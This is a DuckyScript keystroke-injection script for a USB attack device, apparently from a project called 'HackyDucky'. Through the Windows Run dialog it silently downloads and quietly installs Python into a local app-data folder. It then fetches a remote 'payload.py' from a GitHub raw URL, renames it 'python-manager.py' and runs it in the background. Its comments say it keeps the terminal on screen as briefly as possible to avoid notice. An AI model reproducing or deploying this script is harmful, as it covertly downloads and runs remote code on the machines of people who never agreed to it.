REM Entry point for the python script
REM Will open cmd
REM Download python to temp directory 
REM Install python quietly via cmdline
REM Download and run the main payload

DEFAULT_DELAY 50

GUI r
STRING cmd
ENTER
DELAY 500

REM Download python
REM start /b runs process in background - we want the terminal to stay on the screen for as little as possible
STRING cd %localappdata%
ENTER
STRING start /b curl --create-dirs --output-dir %localappdata%\temp -o tmp7.exe "https://www.python.org/ftp/python/3.13.5/python-3.13.5-amd64.exe"
ENTER

REM Because curl is background we can kill command prompt
ALT F4
DELAY 10000

GUI r
STRING cmd
ENTER
DELAY 500

REM Install python
GUI r
DELAY 100
STRING start /b %localappdata%\temp\tmp7.exe /log nul /quiet TargetDir=%localappdata%\python1 AssociateFiles=0 CompileAll=1 Include_doc=0 Include_launcher=0 Include_tcltk=0 Include_test=0
DELAY 30000

REM Download main payload
GUI r
DELAY 100
STRING start /b curl -output-dir %localappdata%\python1 -o python-manager.py "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py"
DELAY 3000

REM Run main payload
GUI r
DELAY 100
STRING start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py